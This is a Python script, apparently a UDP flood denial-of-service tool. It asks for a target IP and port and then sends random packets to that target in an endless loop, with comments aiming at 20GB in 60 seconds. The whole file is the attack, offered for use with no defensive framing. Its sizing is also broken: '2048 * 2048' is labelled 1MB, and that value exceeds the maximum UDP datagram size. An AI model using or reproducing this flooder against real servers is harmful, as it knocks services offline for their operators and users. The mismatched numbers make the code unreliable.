import socket
import random
import time

# User input for target IP and UDP port
target_ip = input("Enter the target server IP: ")
target_port = int(input("Enter the target server UDP port: "))

# Define the packet size in bytes (1MB here)
packet_size = 2048 * 2048  # 1MB packet size
# Number of packets required to send 20GB in 60 seconds
# 20GB / 1MB = 20,000 packets in 60 seconds
packets_to_send = 20000
send_interval = 0.003  # Interval between packets to hit high sending rate

def flood_traffic():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        # Generate random packet of the defined size
        packet = random._urandom(packet_size)
        
        # Send the packet to the target
        sock.sendto(packet, (target_ip, target_port))

        # Sleep to control the rate (so we can send around 20GB in 60 seconds)
        time.sleep(send_interval)

if __name__ == "__main__":
    flood_traffic()
